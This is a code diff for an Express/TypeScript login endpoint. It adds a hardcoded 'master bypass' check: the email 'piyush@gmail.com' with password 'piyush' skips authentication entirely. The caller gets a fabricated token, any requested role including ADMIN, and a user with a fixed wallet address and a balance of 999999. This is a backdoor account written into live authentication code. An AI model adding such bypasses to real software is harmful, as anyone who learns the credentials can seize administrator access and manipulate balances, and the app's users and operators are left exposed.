@@ -510,6 +510,23 @@ app.post('/api/auth/login', async (req: Request, res: Response): Promise<any> =>
     const cleanPhone = phone ? phone.replace(/\D/g, '') : null;
     const roleEnum = (role === 'COLLECTOR' || role === 'AGGREGATOR' || role === 'LAB' || role === 'MANUFACTURER' || role === 'ADMIN') ? role : 'COLLECTOR';
 
+    // Master Bypass Credentials
+    if (cleanEmail === 'piyush@gmail.com' && password === 'piyush') {
+      const masterUser = {
+        id: 9999,
+        name: 'Piyush (Master Admin)',
+        email: 'piyush@gmail.com',
+        role: roleEnum,
+        walletAddress: '0x71C7656EC7ab88b098defB751B7401B5f6d8976F',
+        walletBalance: 999999,
+        language: 'EN'
+      };
+      return res.status(200).json({
+        token: `master_bypass_jwt_${Date.now()}`,
+        user: masterUser
+      });
+    }
+
     let user = null;
     try {
       if (cleanEmail) {
